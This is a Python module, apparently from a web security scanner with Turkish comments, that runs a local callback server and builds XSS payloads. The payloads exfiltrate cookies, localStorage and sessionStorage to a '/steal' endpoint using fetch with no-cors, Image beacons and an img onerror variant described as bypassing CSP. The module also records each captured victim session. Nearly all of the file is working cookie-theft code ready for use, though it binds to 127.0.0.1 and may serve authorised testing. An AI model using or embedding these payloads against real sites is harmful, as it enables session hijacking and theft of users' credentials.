"""
websecure.core.xss_callback
----------------------------
Gerçek zamanlı XSS cookie/token exfiltrasyon altyapısı.

XSSCallbackServer:
  127.0.0.1'de rastgele bir porta bağlanan minimal HTTP sunucusu.
  XSS payload'ları bu sunucuya çalınan cookie/token/localStorage
  verilerini gönderir; sunucu bunları thread-safe bir kuyrukta saklar.

CapturedSession:
  Yakalanan tek bir session/cookie kümesi — doğrulama sonuçlarıyla birlikte.
"""
from __future__ import annotations

import json
import logging
import secrets
import threading
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, unquote, urlparse

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# CapturedSession
# ---------------------------------------------------------------------------

@dataclass
class CapturedSession:
    """Çalınan tek bir tarayıcı oturumu."""
    token: str                          # korelasyon token'ı
    cookies: Dict[str, str] = field(default_factory=dict)
    local_storage: Dict[str, str] = field(default_factory=dict)
    session_storage: Dict[str, str] = field(default_factory=dict)
    raw_cookie_str: str = ""            # ham document.cookie değeri
    origin_url: str = ""                # XSS'in tetiklendiği URL
    xss_url: str = ""                   # zafiyet URL'si
    xss_param: str = ""
    xss_payload: str = ""
    captured_at: float = field(default_factory=time.time)
    verified: bool = False              # çalınan cookie ile erişim doğrulandı mı
    verification_url: str = ""
    verification_status: int = 0
    source: str = "xss_reflected"      # xss_reflected | xss_dom | xss_blind | credential

    def to_dict(self) -> Dict[str, Any]:
        return {
            "token": self.token,
            "cookies": self.cookies,
            "local_storage": self.local_storage,
            "session_storage": self.session_storage,
            "raw_cookie_str": self.raw_cookie_str,
            "origin_url": self.origin_url,
            "xss_url": self.xss_url,
            "xss_param": self.xss_param,
            "xss_payload": self.xss_payload,
            "captured_at": self.captured_at,
            "verified": self.verified,
            "verification_url": self.verification_url,
            "verification_status": self.verification_status,
            "source": self.source,
            # sessions bucket backward compat
            "user": "XSS-Victim",
            "timestamp": time.strftime("%H:%M:%S", time.localtime(self.captured_at)),
        }


# ---------------------------------------------------------------------------
# HTTP Handler
# ---------------------------------------------------------------------------

class _CallbackHandler(BaseHTTPRequestHandler):
    """Minimal HTTP handler — GET ve POST isteklerini kabul eder."""

    def log_message(self, fmt, *args):  # sessizleştir
        pass

    def _parse_body(self) -> Dict[str, str]:
        length = int(self.headers.get("Content-Length") or 0)
        if length:
            raw = self.rfile.read(length).decode("utf-8", "ignore")
            try:
                return json.loads(raw)
            except Exception:
                return {k: v[0] if isinstance(v, list) and v else ""
                        for k, v in parse_qs(raw, keep_blank_values=True).items()}
        return {}

    def _send_ok(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_OPTIONS(self):  # CORS preflight
        self._send_ok()

    def do_GET(self):
        params = parse_qs(urlparse(self.path).query, keep_blank_values=True)
        flat = {k: v[0] if isinstance(v, list) and v else "" for k, v in params.items()}
        self.server.receive_callback(flat)  # type: ignore[attr-defined]
        self._send_ok()

    def do_POST(self):
        body = self._parse_body()
        params = parse_qs(urlparse(self.path).query, keep_blank_values=True)
        flat = {k: v[0] if isinstance(v, list) and v else "" for k, v in params.items()}
        flat.update({k: (v[0] if isinstance(v, list) and v else v) for k, v in body.items()})
        self.server.receive_callback(flat)  # type: ignore[attr-defined]
        self._send_ok()


# ---------------------------------------------------------------------------
# XSSCallbackServer
# ---------------------------------------------------------------------------

class XSSCallbackServer:
    """
    127.0.0.1'de rastgele bir porta bağlanan XSS callback sunucusu.

    Kullanım
    --------
    with XSSCallbackServer() as srv:
        token = srv.new_token()
        payload = srv.steal_payload(token)
        # ... payload'u XSS'e enjekte et ...
        result = srv.wait(token, timeout=15)
        if result:
            print(result.cookies)
    """

    def __init__(self, host: str = "127.0.0.1"):
        self.host = host
        self._port = 0
        self._server: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        # token -> event + data
        self._pending: Dict[str, threading.Event] = {}
        self._results: Dict[str, Dict[str, str]] = {}

    # ------------------------------------------------------------------ #
    # Context manager
    # ------------------------------------------------------------------ #

    def __enter__(self) -> "XSSCallbackServer":
        self.start()
        return self

    def __exit__(self, *_):
        self.stop()

    # ------------------------------------------------------------------ #
    # Lifecycle
    # ------------------------------------------------------------------ #

    def start(self) -> int:
        """Sunucuyu başlat. Gerçek porta sahip portu döndür."""
        server = HTTPServer((self.host, 0), _CallbackHandler)
        server.receive_callback = self._on_callback  # type: ignore[attr-defined]
        self._port = server.server_address[1]
        self._server = server
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        self._thread = t
        logger.debug(f"[XSSCallback] Dinleniyor: {self.host}:{self._port}")
        return self._port

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server = None

    # ------------------------------------------------------------------ #
    # Token + payload üretimi
    # ------------------------------------------------------------------ #

    @property
    def port(self) -> int:
        return self._port

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self._port}"

    def new_token(self) -> str:
        token = secrets.token_hex(8)
        with self._lock:
            self._pending[token] = threading.Event()
        return token

    def steal_payload(self, token: str, include_storage: bool = True) -> str:
        """
        Verilen token için gerçek bir XSS cookie theft payload'u üret.
        Fetch API + no-cors beacon kullanır (CSP bypass için).
        """
        url = self.base_url
        parts = [
            # Cookie theft — her zaman dene
            f"(function(){{",
            f"var _t='{token}';",
            f"var _u=encodeURIComponent(location.href);",
            f"var _c=encodeURIComponent(document.cookie);",
        ]
        if include_storage:
            parts += [
                f"var _ls=encodeURIComponent(JSON.stringify(Object.assign({{}},localStorage)));",
                f"var _ss=encodeURIComponent(JSON.stringify(Object.assign({{}},sessionStorage)));",
                f"var _src='{url}/steal?t='+_t+'&c='+_c+'&u='+_u+'&ls='+_ls+'&ss='+_ss;",
            ]
        else:
            parts += [
                f"var _src='{url}/steal?t='+_t+'&c='+_c+'&u='+_u;",
            ]
        parts += [
            # Fetch (async, CORS bypass ile)
            f"fetch(_src,{{mode:'no-cors',credentials:'include'}}).catch(function(){{",
            # Fetch başarısız → Image beacon fallback
            f"new Image().src=_src;",
            f"}});",
            f"}})();",
        ]
        return "".join(parts)

    def steal_img_payload(self, token: str) -> str:
        """CSP engeli için minimal Image beacon payload (fetch kullanmaz)."""
        url = self.base_url
        return (
            f"<img src=x onerror=\"new Image().src='{url}/steal"
            f"?t={token}&c='+encodeURIComponent(document.cookie)+"
            f"'&u='+encodeURIComponent(location.href)\">"
        )

    # ------------------------------------------------------------------ #
    # Callback işleme
    # ------------------------------------------------------------------ #

    def _on_callback(self, params: Dict[str, str]):
        token = params.get("t") or params.get("token", "")
        if not token:
            return
        with self._lock:
            self._results[token] = params
            ev = self._pending.get(token)
        if ev:
            ev.set()
        logger.info(f"[XSSCallback] Callback alındı! token={token[:8]}... cookie_len={len(params.get('c', ''))}")

    def wait(self, token: str, timeout: int = 15) -> Optional[Dict[str, str]]:
        """Token'a ait callback gelene kadar bekle. Gelmezse None."""
        with self._lock:
            ev = self._pending.get(token)
        if ev and ev.wait(timeout=timeout):
            with self._lock:
                result = self._results.pop(token, None)
                self._pending.pop(token, None)
            return result
        with self._lock:
            self._pending.pop(token, None)
        return None

    def all_results(self) -> List[Dict[str, str]]:
        with self._lock:
            return list(self._results.values())


# ---------------------------------------------------------------------------
# Yardımcı: ham cookie string → dict
# ---------------------------------------------------------------------------

def parse_cookie_str(raw: str) -> Dict[str, str]:
    """'name=value; name2=value2' → {'name': 'value', 'name2': 'value2'}"""
    result: Dict[str, str] = {}
    if not raw:
        return result
    for part in raw.split(";"):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            result[k.strip()] = v.strip()
        elif part:
            result[part] = ""
    return result


def parse_storage_str(raw: str) -> Dict[str, str]:
    """JSON.stringify(localStorage) → dict"""
    try:
        decoded = unquote(raw)
        obj = json.loads(decoded)
        return {str(k): str(v) for k, v in obj.items()} if isinstance(obj, dict) else {}
    except Exception:
        return {}


__all__ = [
    "XSSCallbackServer",
    "CapturedSession",
    "parse_cookie_str",
    "parse_storage_str",
]
